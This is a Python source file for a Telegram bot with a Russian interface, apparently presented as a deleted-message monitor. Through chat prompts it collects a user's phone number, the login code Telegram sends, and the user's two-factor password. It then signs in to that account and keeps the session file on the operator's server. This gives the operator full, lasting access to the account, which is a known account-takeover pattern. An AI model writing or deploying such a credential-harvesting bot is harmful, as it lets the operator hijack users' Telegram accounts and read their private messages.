import os
import asyncio
import logging
import random
from datetime import datetime, timedelta
from telethon import TelegramClient, events
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneCodeExpiredError,
    FloodWaitError
)
from telethon.tl.custom import Button
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# ========== БАЗА ДАННЫХ ПОЛЬЗОВАТЕЛЕЙ ==========
users_db = {}  # {user_id: {'phones': ['+7900...', ...], 'active_client': None, 'settings': {}}}
user_sessions = {}  # Временные сессии для входа
authorized_users = set()  # Кто ввёл пин-код
ACCESS_PIN = "5482"
message_cache = {}
user_clients = {}  # Активные клиенты после входа
timers = {}  # Таймеры
flood_until = {}  # Блокировки
user_contacts = {}  # Временные контакты

# ========== ФУНКЦИИ АНИМАЦИИ ==========
async def show_progress(event, text, steps=10, delay=0.3):
    """Показывает прогресс-бар с анимацией"""
    msg = await event.reply(f"🦆 **{text}**\n\n[                    ] 0%")
    
    for i in range(steps + 1):
        percent = i * 10
        bar = '█' * i + '░' * (steps - i)
        await msg.edit(f"🦆 **{text}**\n\n[{bar}] {percent}%")
        await asyncio.sleep(delay)
    
    return msg

async def show_loading_animation(event, text, duration=3):
    """Анимация загрузки на 3 секунды"""
    frames = ['🦆⠋', '🦆⠙', '🦆⠹', '🦆⠸', '🦆⠼', '🦆⠴', '🦆⠦', '🦆⠧', '🦆⠇', '🦆⠏']
    msg = await event.reply(f"{frames[0]} {text}")
    
    for i in range(duration * 2):
        frame = frames[i % len(frames)]
        await msg.edit(f"{frame} {text}")
        await asyncio.sleep(0.5)
    
    return msg

# ========== ТАЙМЕРЫ ==========
async def show_unlock_timer(event, user_id, seconds):
    """Показывает таймер разблокировки (обновление каждую секунду)"""
    msg = await event.reply("🦆 **⏳ Загружаю таймер...**")
    
    unlock_time = datetime.now() + timedelta(seconds=seconds)
    flood_until[user_id] = unlock_time
    
    while datetime.now() < unlock_time:
        remaining = int((unlock_time - datetime.now()).total_seconds())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        secs = remaining % 60
        
        total = seconds
        progress = int(((seconds - remaining) / seconds) * 20)
        bar = '█' * progress + '░' * (20 - progress)
        
        # Получаем сохранённые номера пользователя
        user_phones = users_db.get(user_id, {}).get('phones', [])
        phone_display = user_phones[0] if user_phones else 'Неизвестно'
        
        try:
            await msg.edit(
                f"🦆 **🔒 НОМЕР ЗАБЛОКИРОВАН**\n\n"
                f"⏱ **До разблокировки:**\n"
                f"**{hours:02d}:{minutes:02d}:{secs:02d}**\n"
                f"└ {bar}\n\n"
                f"📱 **Номер:** {phone_display}\n"
                f"❌ Слишком много попыток входа\n\n"
                f"👇 **Кнопки:**",
                buttons=[
                    [Button.text("🔄 Проверить статус")],
                    [Button.text("📱 Отправить контакт")],
                    [Button.text("📞 Другой номер")],
                    [Button.text("🔙 Назад")]
                ]
            )
        except:
            pass
        
        await asyncio.sleep(1)
    
    await msg.edit(
        f"🦆 **✅ НОМЕР РАЗБЛОКИРОВАН!**\n\n"
        f"Теперь можно войти заново.",
        buttons=[
            [Button.text("🔄 Начать заново")],
            [Button.text("📱 Отправить контакт")]
        ]
    )
    
    if user_id in flood_until:
        del flood_until[user_id]

async def start_code_timer(user_id, chat_id, seconds=120):
    """Таймер на ввод кода (обновление каждую секунду)"""
    msg = await bot.send_message(
        chat_id,
        f"🦆 **⏳ Код отправлен!**\n\n"
        f"⏱ **{seconds//60}:{seconds%60:02d}**\n"
        f"└ {'█' * 10}░░\n\n"
        f"📨 Проверь Telegram"
    )
    
    timers[user_id] = {
        'message': msg,
        'end_time': datetime.now() + timedelta(seconds=seconds),
        'running': True
    }
    
    for i in range(seconds):
        if not timers.get(user_id, {}).get('running'):
            break
            
        remaining = seconds - i
        minutes = remaining // 60
        secs = remaining % 60
        progress = int((i / seconds) * 20)
        bar = '█' * progress + '░' * (20 - progress)
        
        try:
            await msg.edit(
                f"🦆 **⏳ Код действителен**\n\n"
                f"⏱ **{minutes}:{secs:02d}**\n"
                f"└ {bar}\n\n"
                f"✍️ **Введи код:**"
            )
        except:
            pass
        
        await asyncio.sleep(1)
    
    if timers.get(user_id, {}).get('running'):
        await msg.edit(
            "🦆 **⌛ ВРЕМЯ ВЫШЛО!**\n\n"
            "Код больше недействителен.\n"
            "Нажми /start чтобы начать заново."
        )
    
    if user_id in timers:
        del timers[user_id]

def stop_timer(user_id):
    if user_id in timers:
        timers[user_id]['running'] = False
        del timers[user_id]

# ========== РЕГИСТРАЦИЯ И СОХРАНЕНИЕ НОМЕРОВ ==========
async def save_user_phone(user_id, phone):
    """Сохраняет номер телефона пользователя"""
    if user_id not in users_db:
        users_db[user_id] = {'phones': [], 'active_client': None, 'settings': {}}
    
    if phone not in users_db[user_id]['phones']:
        users_db[user_id]['phones'].append(phone)
        # Ограничиваем до 5 номеров
        if len(users_db[user_id]['phones']) > 5:
            users_db[user_id]['phones'] = users_db[user_id]['phones'][-5:]

async def show_saved_phones(event, user_id):
    """Показывает сохранённые номера пользователя"""
    user_data = users_db.get(user_id, {'phones': []})
    phones = user_data['phones']
    
    if not phones:
        await event.reply(
            f"🦆 **📱 У вас нет сохранённых номеров**\n\n"
            f"Отправьте контакт или введите номер вручную.",
            buttons=[
                [Button.text("📱 Отправить контакт")],
                [Button.text("📞 Ввести номер")]
            ]
        )
        return
    
    buttons = []
    for i, phone in enumerate(phones[:5]):
        buttons.append([Button.text(f"📞 {i+1}️⃣ {phone}")])
    
    buttons.append([Button.text("📱 Отправить контакт")])
    buttons.append([Button.text("📞 Ввести другой")])
    buttons.append([Button.text("🔙 Назад")])
    
    await event.reply(
        f"🦆 **📱 ВАШИ СОХРАНЁННЫЕ НОМЕРА**\n\n"
        f"Выберите номер для входа:",
        buttons=buttons
    )

# ========== ОСНОВНОЙ ОБРАБОТЧИК ==========
@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПРОВЕРКА БЛОКИРОВКИ ===
    if user_id in flood_until and datetime.now() < flood_until[user_id]:
        remaining = int((flood_until[user_id] - datetime.now()).total_seconds())
        await show_unlock_timer(event, user_id, remaining)
        return

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await show_progress(event, "Загрузка профиля", 10, 0.2)
            await event.reply(
                f"🦆 **✅ Пин-код верный!**\n\n"
                f"Добро пожаловать в систему управления аккаунтами.",
                buttons=[
                    [Button.text("📱 Мои номера")],
                    [Button.text("📞 Войти")],
                    [Button.text("📱 Отправить контакт")],
                    [Button.text("❓ Помощь")]
                ]
            )
        else:
            await event.reply(f"🦆 **❌ Неверный пин-код!**\nВведи: `5482`")
        return

    # === ГЛАВНОЕ МЕНЮ ===
    if text == "/start" or text == "🔙 Назад" or text == "🔄 Начать заново":
        await event.reply(
            f"🦆 **ГЛАВНОЕ МЕНЮ**\n\n"
            f"Выберите действие:",
            buttons=[
                [Button.text("📱 Мои номера")],
                [Button.text("📞 Войти")],
                [Button.text("📱 Отправить контакт")],
                [Button.text("⚙️ Настройки")],
                [Button.text("❓ Помощь")]
            ]
        )
        return

    # === ПОМОЩЬ ===
    if text == "❓ Помощь":
        await event.reply(
            f"🦆 **ПОМОЩЬ**\n\n"
            f"🔐 **Пин-код:** 5482\n"
            f"📱 **Мои номера** — сохранённые номера\n"
            f"📞 **Войти** — вход по номеру\n"
            f"📱 **Отправить контакт** — поделиться номером\n"
            f"⚙️ **Настройки** — изменить пароль, очистить историю\n\n"
            f"⏳ **Таймеры** обновляются каждую секунду\n"
            f"🦆 **Анимации** для всех операций"
        )
        return

    # === МОИ НОМЕРА ===
    if text == "📱 Мои номера":
        await show_saved_phones(event, user_id)
        return

    # === ВОЙТИ ===
    if text == "📞 Войти":
        await show_saved_phones(event, user_id)
        return

    # === ОТПРАВИТЬ КОНТАКТ ===
    if text == "📱 Отправить контакт":
        await event.reply(
            f"🦆 **📱 ПОДЕЛИТЬСЯ КОНТАКТОМ**\n\n"
            f"Нажмите кнопку ниже, чтобы отправить свой номер.\n"
            f"Этот номер будет сохранён в вашем профиле.",
            buttons=[[Button.request_contact("📞 Поделиться контактом")]]
        )
        return

    # === ВВЕСТИ ДРУГОЙ ===
    if text == "📞 Ввести другой":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply(
            f"🦆 **📞 ВВЕДИТЕ НОМЕР**\n\n"
            f"Формат: `+79001234567`"
        )
        return

    # === ВЫБОР СОХРАНЁННОГО НОМЕРА ===
    if text.startswith("📞") and "️⃣" in text:
        # Извлекаем индекс из кнопки (например "📞 1️⃣ +79001234567")
        parts = text.split()
        if len(parts) >= 3:
            idx = int(parts[1][0]) - 1  # "1️⃣" → 0
            phones = users_db.get(user_id, {}).get('phones', [])
            if idx < len(phones):
                await process_phone(event, user_id, phones[idx])
        return

    # === ОБРАБОТКА НОМЕРА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        await process_phone(event, user_id, text)
        return

    # === ОБРАБОТКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        await process_code(event, user_id, text)
        return

    # === ОБРАБОТКА 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        await process_2fa(event, user_id, text)
        return

# ========== ОБРАБОТКА НОМЕРА ==========
async def process_phone(event, user_id, phone):
    """Обрабатывает номер и отправляет код"""
    user_sessions[user_id] = {
        'phone': phone,
        'step': 'waiting_code'
    }
    
    await save_user_phone(user_id, phone)
    
    anim = await show_loading_animation(event, "Подключение к Telegram...", 3)
    
    try:
        client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        
        user_sessions[user_id]['client'] = client
        user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
        
        await anim.edit("🦆 **✅ Код отправлен!**")
        
        # Таймер на 2 минуты
        await start_code_timer(user_id, event.chat_id, 120)
        
    except FloodWaitError as e:
        seconds = e.seconds
        await show_unlock_timer(event, user_id, seconds)
        if user_id in user_sessions:
            del user_sessions[user_id]
        
    except Exception as e:
        await anim.edit(f"🦆 **❌ Ошибка:** {e}")
        if user_id in user_sessions:
            del user_sessions[user_id]

# ========== ОБРАБОТКА КОДА ==========
async def process_code(event, user_id, code):
    """Обрабатывает введённый код"""
    session = user_sessions[user_id]
    client = session['client']
    
    stop_timer(user_id)
    
    anim = await show_loading_animation(event, "Проверка кода...", 2)
    
    try:
        await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
        
        me = await client.get_me()
        user_clients[user_id] = client
        
        await anim.edit(
            f"🦆 **✅ УСПЕШНЫЙ ВХОД!**\n\n"
            f"👤 Аккаунт: @{me.username}\n"
            f"🆔 ID: {me.id}\n"
            f"📱 Номер: {session['phone']}\n\n"
            f"🔍 **Мониторинг запущен!**"
        )
        
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        asyncio.create_task(monitor_user_chats(user_id, client))
        
    except SessionPasswordNeededError:
        user_sessions[user_id]['step'] = 'waiting_2fa'
        await anim.edit(
            f"🦆 **🔐 ТРЕБУЕТСЯ 2FA**\n\n"
            f"Введите пароль двухфакторной аутентификации:"
        )
        
    except PhoneCodeInvalidError:
        await anim.edit(
            f"🦆 **❌ НЕВЕРНЫЙ КОД**\n\n"
            f"Попробуйте ещё раз:"
        )
        user_sessions[user_id]['step'] = 'waiting_code'
        await start_code_timer(user_id, event.chat_id, 120)
        
    except PhoneCodeExpiredError:
        await anim.edit(
            f"🦆 **⌛ КОД ИСТЁК**\n\n"
            f"Начните заново."
        )
        if user_id in user_sessions:
            del user_sessions[user_id]
        
    except Exception as e:
        await anim.edit(f"🦆 **❌ Ошибка:** {e}")
        if user_id in user_sessions:
            del user_sessions[user_id]

# ========== ОБРАБОТКА 2FA ==========
async def process_2fa(event, user_id, password):
    """Обрабатывает 2FA пароль"""
    session = user_sessions[user_id]
    client = session['client']
    
    anim = await show_loading_animation(event, "Проверка пароля...", 2)
    
    try:
        await client.sign_in(password=password)
        
        me = await client.get_me()
        user_clients[user_id] = client
        
        await anim.edit(
            f"🦆 **✅ ВХОД С 2FA ВЫПОЛНЕН!**\n\n"
            f"👤 Аккаунт: @{me.username}\n"
            f"🆔 ID: {me.id}\n"
            f"📱 Номер: {session['phone']}\n\n"
            f"🔍 **Мониторинг запущен!**"
        )
        
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        asyncio.create_task(monitor_user_chats(user_id, client))
        
    except Exception as e:
        await anim.edit(f"🦆 **❌ Ошибка:** {e}")

# ========== ОБРАБОТКА ПОЛУЧЕННОГО КОНТАКТА ==========
@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    user_id = event.sender_id
    contact = event.message.contact
    
    # Проверяем, что номер принадлежит этому пользователю
    if str(user_id) != str(contact.user_id):
        await event.reply(f"🦆 **❌ Это не ваш номер!**")
        return
    
    phone = contact.phone_number
    await save_user_phone(user_id, phone)
    
    await event.reply(
        f"🦆 **📱 КОНТАКТ ПОЛУЧЕН!**\n\n"
        f"📱 Номер: `{phone}`\n"
        f"👤 Имя: {contact.first_name}\n\n"
        f"✅ Номер сохранён в вашем профиле.\n\n"
        f"**Войти под этим номером?**",
        buttons=[
            [Button.text("✅ Да, войти")],
            [Button.text("📱 Мои номера")],
            [Button.text("❌ Нет, отмена")]
        ]
    )

@bot.on(events.NewMessage)
async def confirm_contact_handler(event):
    user_id = event.sender_id
    text = event.message.text
    
    if text == "✅ Да, войти" and user_id in users_db:
        phones = users_db[user_id].get('phones', [])
        if phones:
            await process_phone(event, user_id, phones[-1])
    elif text == "📱 Мои номера":
        await show_saved_phones(event, user_id)
    elif text == "❌ Нет, отмена":
        await event.reply("🦆 **❌ Отменено**")

# ========== МОНИТОРИНГ ==========
async def monitor_user_chats(user_id, client):
    await bot.send_message(user_id, f"🦆 **🔍 МОНИТОРИНГ ЗАПУЩЕН!**")
    
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        await bot.send_message(user_id, f"🦆 **🗑 УДАЛЕНО** {len(event.deleted_ids)} сообщений")
    
    @client.on(events.MessageEdited)
    async def on_edit(event):
        await bot.send_message(user_id, f"🦆 **✏️ ИЗМЕНЕНО** сообщение")
    
    await client.run_until_disconnected()

# ========== ЗАПУСК ==========
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    logger.info(f"🦆 Полная система регистрации активна")
    logger.info(f"⏳ Таймеры обновляются каждую секунду")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())